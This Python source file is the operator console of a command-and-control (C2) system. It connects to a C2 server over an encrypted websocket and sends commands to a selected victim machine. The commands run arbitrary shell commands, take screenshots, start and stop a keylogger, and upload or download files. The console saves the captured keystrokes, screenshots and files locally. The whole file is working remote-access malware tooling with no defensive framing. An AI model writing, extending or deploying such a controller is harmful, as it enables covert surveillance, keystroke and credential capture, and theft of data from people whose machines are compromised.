import asyncio
import websockets
import json
import cmd
import sys
import base64
from crypto_utils import CryptoUtils
from datetime import datetime
import os
from config import SERVER_URL, ENCRYPTION_KEY

class C2Controller(cmd.Cmd):
    intro = '''
    ╔═══════════════════════════════════════════╗
    ║           C2 Controller Console            ║
    ║     Type 'help' or '?' to list commands   ║
    ╚═══════════════════════════════════════════╝
    '''
    prompt = '(c2) '

    def __init__(self):
        super().__init__()
        self.crypto = CryptoUtils(ENCRYPTION_KEY.encode() if ENCRYPTION_KEY else None)
        self.websocket = None
        self.current_target = None
        self.running = True
        self.connected_clients = {}

    async def connect(self):
        try:
            self.websocket = await websockets.connect(SERVER_URL)
            # 发送身份信息
            await self.send_message({
                'type': 'controller',
                'timestamp': datetime.now().isoformat()
            })
            return True
        except Exception as e:
            print(f"Connection error: {str(e)}")
            return False

    async def send_message(self, message):
        if self.websocket:
            encrypted_message = self.crypto.encrypt(json.dumps(message))
            await self.websocket.send(encrypted_message)

    async def receive_messages(self):
        while self.running:
            try:
                if not self.websocket:
                    await asyncio.sleep(1)
                    continue
                    
                message = await self.websocket.recv()
                decrypted_message = self.crypto.decrypt(message)
                data = json.loads(decrypted_message)
                self.handle_response(data)
            except websockets.exceptions.ConnectionClosed:
                print("\nConnection to server lost. Attempting to reconnect...")
                await self.reconnect()
            except Exception as e:
                print(f"\nError receiving message: {str(e)}")
                await asyncio.sleep(1)

    async def reconnect(self):
        while self.running:
            try:
                if await self.connect():
                    print("Reconnected to server.")
                    break
            except:
                await asyncio.sleep(5)

    def handle_response(self, response):
        if response.get('status') == 'success':
            if 'stdout' in response:
                print("\nCommand output:")
                if response['stdout']:
                    print(response['stdout'].strip())
                if response['stderr']:
                    print("\nErrors:")
                    print(response['stderr'].strip())
            elif 'image_data' in response:
                timestamp = response.get('timestamp', datetime.now().isoformat())
                filename = f"screenshot_{timestamp.replace(':', '-')}.png"
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(response['image_data']))
                print(f"\nScreenshot saved as {filename}")
            elif 'keystrokes' in response:
                print("\nKeylogger data:")
                for entry in response['keystrokes']:
                    print(f"{entry['timestamp']}: {entry['key']}")
            elif 'content' in response:
                print(f"\nDownloaded file content saved as: {response.get('filename', 'downloaded_file')}")
                with open(response['filename'], 'wb') as f:
                    f.write(base64.b64decode(response['content']))
            else:
                print("\nResponse:", json.dumps(response, indent=2))
        else:
            print("\nError:", response.get('message', 'Unknown error'))

    def do_target(self, arg):
        """Set the target client ID: target <client_id>"""
        if not arg:
            print("Current target:", self.current_target if self.current_target else "None")
            return
        self.current_target = arg.strip()
        print(f"Target set to: {self.current_target}")

    def do_shell(self, arg):
        """Execute a shell command on the target: shell <command>"""
        if not self.current_target:
            print("No target selected. Use 'target' command first.")
            return
        
        if not arg:
            print("Please provide a command to execute.")
            return

        asyncio.get_event_loop().run_until_complete(self.send_message({
            'target_client': self.current_target,
            'command': {
                'type': 'shell',
                'data': {'command': arg}
            }
        }))

    def do_screenshot(self, arg):
        """Take a screenshot on the target machine"""
        if not self.current_target:
            print("No target selected. Use 'target' command first.")
            return
        
        asyncio.get_event_loop().run_until_complete(self.send_message({
            'target_client': self.current_target,
            'command': {
                'type': 'screenshot'
            }
        }))

    def do_keylogger(self, arg):
        """Start or stop the keylogger: keylogger <start|stop>"""
        if not self.current_target:
            print("No target selected. Use 'target' command first.")
            return
        
        action = arg.strip().lower()
        if action not in ['start', 'stop']:
            print("Invalid action. Use 'start' or 'stop'.")
            return
        
        asyncio.get_event_loop().run_until_complete(self.send_message({
            'target_client': self.current_target,
            'command': {
                'type': f'keylogger_{action}'
            }
        }))

    def do_upload(self, arg):
        """Upload a file to the target: upload <local_path> <remote_path>"""
        if not self.current_target:
            print("No target selected. Use 'target' command first.")
            return
        
        try:
            local_path, remote_path = arg.split()
            if not os.path.exists(local_path):
                print(f"Local file not found: {local_path}")
                return

            with open(local_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            
            asyncio.get_event_loop().run_until_complete(self.send_message({
                'target_client': self.current_target,
                'command': {
                    'type': 'upload',
                    'data': {
                        'path': remote_path,
                        'content': content
                    }
                }
            }))
        except ValueError:
            print("Usage: upload <local_path> <remote_path>")
        except Exception as e:
            print(f"Error: {str(e)}")

    def do_download(self, arg):
        """Download a file from the target: download <remote_path>"""
        if not self.current_target:
            print("No target selected. Use 'target' command first.")
            return
        
        if not arg:
            print("Please specify the remote file path to download.")
            return

        asyncio.get_event_loop().run_until_complete(self.send_message({
            'target_client': self.current_target,
            'command': {
                'type': 'download',
                'data': {
                    'path': arg.strip()
                }
            }
        }))

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_exit(self, arg):
        """Exit the controller"""
        self.running = False
        if self.websocket:
            asyncio.get_event_loop().run_until_complete(self.websocket.close())
        return True

    def do_EOF(self, arg):
        """Exit on Ctrl-D"""
        return self.do_exit(arg)

    def emptyline(self):
        """Do nothing on empty line"""
        pass

async def main():
    controller = C2Controller()
    
    # 连接到服务器
    if await controller.connect():
        print("Connected to C2 server.")
        
        # 创建接收消息的任务
        receive_task = asyncio.create_task(controller.receive_messages())
        
        # 运行命令行界面
        while controller.running:
            try:
                controller.cmdloop()
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
                continue
            except Exception as e:
                print(f"Error: {str(e)}")
                break
        
        # 清理
        receive_task.cancel()
        try:
            await receive_task
        except asyncio.CancelledError:
            pass
    else:
        print("Failed to connect to C2 server.")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nExiting...") 